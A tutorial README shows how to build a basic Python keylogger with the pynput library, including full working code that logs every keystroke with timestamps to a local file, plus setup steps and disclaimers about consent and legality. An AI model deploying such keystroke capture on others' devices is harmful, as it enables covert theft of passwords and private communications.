# Python Keylogger Project

This project demonstrates how to create a simple keylogger in Python. It uses the `pynput` library to listen to keystrokes and log them into a text file. **This project is intended for educational purposes only. Use this code responsibly and only on devices you have permission to monitor.**

## Table of Contents
1. [Project Overview](#project-overview)
2. [Features](#features)
3. [Requirements](#requirements)
4. [Setup Instructions](#setup-instructions)
5. [Code Explanation](#code-explanation)
6. [Running the Keylogger](#running-the-keylogger)
7. [Ethics and Legal Considerations](#ethics-and-legal-considerations)
8. [Troubleshooting](#troubleshooting)
9. [Future Enhancements](#future-enhancements)

---

## Project Overview

A keylogger is a tool that records keystrokes on a computer and saves them to a file. This basic keylogger:
- Listens for keyboard events.
- Logs each keystroke with a timestamp.
- Saves the keystroke log to a text file named `keylog.txt`.

## Features

- Records each key pressed along with a timestamp.
- Stores keystroke data in a text file.
- Simple and concise Python code using the `pynput` library.

## Requirements

- **Python** 3.6 or newer.
- **pynput** library, used to monitor keyboard events.

## Setup Instructions

Follow these steps to set up the keylogger project on your local machine.

### Step 1: Create a Project Folder
Create a folder for this project. For example, you can name it `Keylogger`.

### Step 2: Set Up a Virtual Environment
Navigate to your project folder and set up a virtual environment:
```bash
python -m venv venv
```
Activate the virtual environment:
- On **Windows**:
  ```bash
  .\venv\Scripts\activate
  ```
- On **macOS/Linux**:
  ```bash
  source venv/bin/activate
  ```

### Step 3: Install the `pynput` Library
With your virtual environment active, install `pynput`:
```bash
pip install pynput
```

### Step 4: Add the Keylogger Code
Create a file named `keylogger.py` in your project folder and add the following code:

```python
from pynput.keyboard import Listener
import logging

# Configure logging to store keystrokes in a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        # Log each key pressed
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()
```

## Code Explanation

- **Importing Modules**: The `pynput` module listens to keyboard events, while the `logging` module saves these events to a file.
- **Logging Configuration**: We use `logging.basicConfig()` to set up our log file, `keylog.txt`, where each keystroke is logged with a timestamp.
- **on_press Function**: This function is triggered every time a key is pressed. It logs each key press in the specified format.
- **Starting the Listener**: The `Listener` instance listens for keystrokes, and `listener.join()` keeps it running indefinitely.

## Running the Keylogger

To start logging keystrokes, make sure your virtual environment is active, and then run the keylogger script:
```bash
python keylogger.py
```

The keystrokes will be saved in `keylog.txt`. To stop the program, press `Ctrl+C` in the terminal.

## Ethics and Legal Considerations

This code is provided for educational purposes only. **Using keyloggers on devices without permission is illegal** and may violate privacy and cybersecurity laws. Only use this code on devices you own or have explicit permission to monitor. Violating privacy laws could result in serious legal consequences.

## Troubleshooting

### Issue: `PermissionError` in Windows when Activating Virtual Environment
You might see an error about execution policies when activating your virtual environment in PowerShell.

1. Open PowerShell as Administrator.
2. Temporarily set the execution policy to allow scripts:
   ```powershell
   Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
   ```

### Issue: `ModuleNotFoundError` for `pynput`
Make sure your virtual environment is active and `pynput` is installed:
```bash
pip install pynput
```

  
## Conclusion

This project demonstrates a simple way to capture and log keystrokes using Python. Always use this code responsibly, respecting privacy and legal guidelines.

Happy coding! 😊
```

